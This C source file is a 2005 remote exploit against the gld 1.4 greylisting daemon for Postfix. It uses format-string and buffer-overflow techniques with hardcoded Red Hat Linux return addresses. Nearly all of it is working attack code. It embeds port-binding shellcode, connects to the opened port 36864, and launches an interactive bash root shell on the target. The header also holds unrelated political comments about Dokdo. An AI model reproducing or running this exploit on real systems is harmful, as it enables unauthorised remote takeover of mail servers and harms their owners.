/*
**
**
** 0x82-meOw-linuxer_forever - gld 1.4 remote overflow format string exploit.
** (c) 2005 Team INetCop Security.
**
** Nickname of this code is,
** `Kill two bird with one stone.' or, `One shot, two kill!.'
** hehehe ;-D
**
** Advisory URL: 
** http://x82.inetcop.org/h0me/adv1sor1es/INCSA.2005-0x82-026-GLD.txt
**
** It's as well as RedHat Linux and to gentoo, debian Linux, *BSD.
** You can develop for your flatform.
**
** --
** exploit by "you dong-hun"(Xpl017Elz), <szoahc@hotmail.com>.
** My World: http://x82.inetcop.org
**
**
** P.S: My domain x82.i21c.net encountered compulsion withdrawal from the country.
** They are killing many hackers of the Korea. hehehe ;-p
**
*/
/*
**
** These days, the main issue that strikes Korea is small rocky island "Dokdo".
** You can get more detailed information from following websites.
**
** "Japanese goverment has to follow and learn from German goverment"
**
** I can confidently say "Dokdo is belong to Korea".
**
** (1) reference 
**
** 1) Their claim that the East Sea has some historical precedent worked,
** as some major book and map publishers, educational web sites and other
** reference materials now include the East Sea name along with the Sea of Japan.
** - worldatlas.com-
**
** http://www.worldatlas.com/webimage/countrys/asia/eastsea.htm
**
** 2) On historical perspective and in international law, why there
** is no valid dispute over the ownership of Dokdo.
**
** http://www.prkorea.com/english/textbook/ge03.html
**
** 3)Truth in scholarship
**
** http://www.prkorea.com/english/textbook/maintruth.html
**
**
*/

#include <stdio.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define DEF_HOST "localhost"
#define PORT 2525

struct os_t {
int number;
char *os_type;
unsigned long dtors_addr;
unsigned long shell;
int sflag;
};

struct os_t platform[]={
{
0,"Red Hat Linux release 7.0 (Guinness) gld 1.4 (format string exploit)",
0x0804db98,0xbfffa3bc,15
},
{
1,"Red Hat Linux release 9 (Shrike) gld 1.4 (format string exploit)",
0x0804d14c,0x0805506e,15
},
{
2,"Red Hat Linux release 7.0 (Guinness) gld 1.4 (buffer overflow exploit)",
0,0xbfffa5d8,300
},
{
/* jmp *%esp method */
3,"Red Hat Linux release 9 (Shrike) gld 1.4 (buffer overflow exploit)",
0,0x4212c5eb,254
},
{
4,NULL,0,0,0
}
};

int __debug_chk=0;
char t_atk[0xfff*3];
// This is lovable shellcode, that's sweet in linux platform. 
char shellcode[]= /* portshell shellcode, 128 bytes (tcp/36864) */
"\xeb\x72\x5e\x29\xc0\x89\x46\x10\x40\x89\xc3\x89\x46\x0c\x40\x89"
"\x46\x08\x8d\x4e\x08\xb0\x66\xcd\x80\x43\xc6\x46\x10\x10\x66\x89"
"\x5e\x14\x88\x46\x08\x29\xc0\x89\xc2\x89\x46\x18\xb0\x90\x66\x89"
"\x46\x16\x8d\x4e\x14\x89\x4e\x0c\x8d\x4e\x08\xb0\x66\xcd\x80\x89"
"\x5e\x0c\x43\x43\xb0\x66\xcd\x80\x89\x56\x0c\x89\x56\x10\xb0\x66"
"\x43\xcd\x80\x86\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0\x3f\x41\xcd\x80"
"\xb0\x3f\x41\xcd\x80\x88\x56\x07\x89\x76\x0c\x87\xf3\x8d\x4b\x0c"
"\xb0\x0b\xcd\x80\xe8\x89\xff\xff\xff/bin/sh";

void banrl();
int make_bof_code(unsigned long shell,int size,int type);
int make_fmt_code(unsigned long retloc,unsigned long shell,int sflag);
int setsock(char *host,int port);
void usage(char *args);
void re_connt(int sock);
void conn_shell(int sock);

int main(int argc,char *argv[])
{
int sock,type=0;
int port=(PORT);
char host[256]=DEF_HOST;

int sflag=platform[type].sflag;
unsigned long retloc=platform[type].dtors_addr;
unsigned long shell=platform[type].shell;

(void)banrl();
while((sock=getopt(argc,argv,"DdF:f:R:r:S:s:H:h:T:t:Ii"))!=EOF) {
extern char *optarg;
switch(sock) {
case 'D':
case 'd':
__debug_chk=1;
break;
case 'R':
case 'r':
retloc=strtoul(optarg,NULL,0);
break;
case 'S':
case 's':
shell=strtoul(optarg,NULL,0);
break;
case 'F':
case 'f':
sflag=atoi(optarg);
break;
case 'H':
case 'h':
memset((char *)host,0,sizeof(host));
strncpy(host,optarg,sizeof(host)-1);
break;
case 'T':
case 't':
type=atoi(optarg);
if(type>=4){
(void)usage(argv[0]);
} else {
retloc=platform[type].dtors_addr;
shell=platform[type].shell;
sflag=platform[type].sflag;
}
break;
case 'I':
case 'i':
(void)usage(argv[0]);
break;
case '?':
fprintf(stderr,"Try `%s -i' for more information.\n\n",argv[0]);
exit(-1);
break;
}
}

fprintf(stdout," #\n # target host: %s:%d\n",host,port);
fprintf(stdout," # type: %s\n",platform[type].os_type);
switch(type)
{
case 0:
case 1:
(int)make_fmt_code(retloc,shell,sflag);
break;
case 2:
(int)make_bof_code(shell,sflag,0);
break;
case 3:
(int)make_bof_code(shell,sflag,1);
}

fprintf(stdout," # send code size: %d byte\n",strlen(t_atk));
sock=setsock(host,port);
(void)re_connt(sock);

if(__debug_chk) sleep(10);

send(sock,t_atk,strlen(t_atk),0);
close(sock);

fprintf(stdout," #\n # Waiting rootshell, Trying %s:36864 ...\n",host);
sleep(1);
sock=setsock(host,36864);
(void)re_connt(sock);

fprintf(stdout," # connected to %s:36864 !\n #\n\n",host);
(void)conn_shell(sock);
}

int make_bof_code(unsigned long shell,int size,int type)
{
int a,b;
char nop_shell[8192];
char code_buf[4096];

memset((char *)nop_shell,0,sizeof(nop_shell));
memset((char *)code_buf,0,sizeof(code_buf));
memset((char *)t_atk,0,sizeof(t_atk));

switch(type)
{
case 0:
fprintf(stdout," # method: normal overflow exploit: %d byte\n",size);
/* sender buffer = nop, shellcode */
for(a=0;a<1000-strlen(shellcode);a++)
nop_shell[a]='N';
for(b=0;b<strlen(shellcode);b++)
nop_shell[a++]=shellcode[b];
/* client_address = retaddr */
for(b=0;b<size*4;b+=4)
*(long *)&code_buf[b]=shell;

snprintf(t_atk,sizeof(t_atk)-1,
"sender=%s\r\n"
"client_address=%s\r\n\r\n",nop_shell,code_buf);
break;

case 1:
fprintf(stdout," # method: jmp *%%esp exploit: %d byte\n",size);
/* sender buffer */
for(a=0;a<1000;a++)
nop_shell[a]='N';
/* client_address buffer */
for(b=0;b<size*4;b+=4)
*(long *)&code_buf[b]=0x82828282;
/* ebp */
*(long *)&code_buf[b]=0x41414141;
b+=4;
/* eip (jmp *%esp) */
*(long *)&code_buf[b]=(shell);
b+=4;
/* jmp nop (0xeb,0x08) */
*(long *)&code_buf[b]=0x08eb08eb;
b+=4;
/* dummy, nop */
// 0x0804d280 0xbfffe1c8 0x08049521
*(long *)&code_buf[b]=0x0804d280;
b+=4;
*(long *)&code_buf[b]=0x90909090;//0xbfffe1c8;
b+=4;
*(long *)&code_buf[b]=0x90909090;//0x08049521;
b+=4;
*(long *)&code_buf[b]=0x90909090;
b+=4;
/* shellcode */
for(a=0;a<strlen(shellcode);a++)
code_buf[b++]=shellcode[a];

snprintf(t_atk,sizeof(t_atk)-1,
"sender=%s\r\n"
"client_address=%s\r\n\r\n",nop_shell,code_buf);
}
}

int make_fmt_code(unsigned long retloc,unsigned long shell,int sflag)
{
unsigned char header[256];
unsigned char nop_shell[8192];
int a,b,c,d,e,f;
int addr1,addr2,addr3,addr4;
a=b=c=d=e=f=addr1=addr2=addr3=addr4=0;

memset((char *)header,0,sizeof(header));
memset((char *)nop_shell,0,sizeof(nop_shell));
memset((char *)t_atk,0,sizeof(t_atk));

fprintf(stdout," # Make format string, .dtors: %p\n",retloc);

*(long *)&header[0]=retloc+0;
*(long *)&header[4]=retloc+1;
*(long *)&header[8]=retloc+2;
*(long *)&header[12]=retloc+3;

a=(shell>>24)&0xff;
addr1=(shell>>24)&0xff;
b=(shell>>16)&0xff;
addr2=(shell>>16)&0xff;
c=(shell>>8)&0xff;
addr3=(shell>>8)&0xff;
d=(shell>>0)&0xff;
addr4=(shell>>0)&0xff;

if((addr4-16-65)<10)d+=0x100;
if((addr3-addr4)<10)c+=0x100;
if((addr2-addr3)<10)b+=0x100;

for(e=0;e<320-strlen(shellcode);e++)
nop_shell[e]='N';
for(f=0;f<strlen(shellcode);f++)
nop_shell[e++]=shellcode[f];

fprintf(stdout," #\n # shellcode addr: %p, size: %d byte\n",shell,strlen(nop_shell));
snprintf(t_atk,sizeof(t_atk)-1,
"client_address=%s" /* header */
"%%%ux%%%d$n%%%ux%%%d$n%%%ux%%%d$n%%%ux%%%d$n" /* fmt code */
"%s\r\n\r\n", /* shellcode */
header,d-16-65,(sflag+0),c-addr4,(sflag+1),b-addr3,
(sflag+2),0x100+a-addr2,(sflag+3),nop_shell);
}

void re_connt(int sock)
{
if(sock==-1)
{
fprintf(stdout," #\n # Failed.\n");
fprintf(stdout," # Happy Exploit ! :-)\n #\n\n");
exit(-1);
}
}

int setsock(char *host,int port)
{
int sock;
struct hostent *he;
struct sockaddr_in x82_addr;

if((he=gethostbyname(host))==NULL)
{
herror(" # gethostbyname() error");
return(-1);
}

if((sock=socket(AF_INET,SOCK_STREAM,0))==EOF)
{
perror(" # socket() error");
return(-1);
}

x82_addr.sin_family=AF_INET;
x82_addr.sin_port=htons(port);
x82_addr.sin_addr=*((struct in_addr *)he->h_addr);
bzero(&(x82_addr.sin_zero),8);

if(connect(sock,(struct sockaddr *)&x82_addr,sizeof(struct sockaddr))==EOF)
{
perror(" # connect() error");
return(-1);
}
return(sock);
}

void conn_shell(int sock)
{
int pckt;
char *cmd="uname -a;id;export TERM=vt100;exec bash -i\n";
char rbuf[1024];
fd_set rset;
memset((char *)rbuf,0,1024);

fprintf(stdout," #\n # Kill two bird with one stone!\n");
fprintf(stdout," # OK, It's Rootshell\n #\n\n");
send(sock,cmd,strlen(cmd),0);

while(1)
{
fflush(stdout);
FD_ZERO(&rset);
FD_SET(sock,&rset);
FD_SET(STDIN_FILENO,&rset);
select(sock+1,&rset,NULL,NULL,NULL);

if(FD_ISSET(sock,&rset))
{
pckt=read(sock,rbuf,1024);
if(pckt<=0)
{
fprintf(stdout," #\n # Happy Exploit !\n #\n\n");
exit(0);
}
rbuf[pckt]=0;
printf("%s",rbuf);
}
if(FD_ISSET(STDIN_FILENO,&rset))
{
pckt=read(STDIN_FILENO,rbuf,1024);
if(pckt>0)
{
rbuf[pckt]=0;
write(sock,rbuf,pckt);
}
}
}
return;
}

void banrl()
{
fprintf(stdout,"\n #\n # 0x82-meOw_linuxer_forever - 
Greylisting daemon for Postfix remote exploit\n");
fprintf(stdout," # szoahc(at)hotmail(dot)com\n #\n\n");
}

void usage(char *args)
{
int i;
fprintf(stdout," Usage: %s -options arguments\n\n",args);
fprintf(stdout,"\t-r [retloc] - .dtors address.\n");
fprintf(stdout,"\t-s [shell] - shellcode address.\n");
fprintf(stdout,"\t-f [flag num] - $-flag count.\n");
fprintf(stdout,"\t-h [host] - target hostname.\n");
fprintf(stdout,"\t-t [type num] - target number.\n");
fprintf(stdout,"\t-i - help information.\n\n");

fprintf(stdout," - Target Type Number List -\n\n");
for(i=0;platform[i].os_type!=NULL;i++)
{
fprintf(stdout," {%d} : %s\n",i,platform[i].os_type);
}
fprintf(stdout,"\n Example: %s -t 0 -h localhost\n",args);
fprintf(stdout," Example: %s -r 0x82828282 -s 0x82828282 -f 15\n\n",args);
exit(0);
}

// milw0rm.com [2005-04-13]
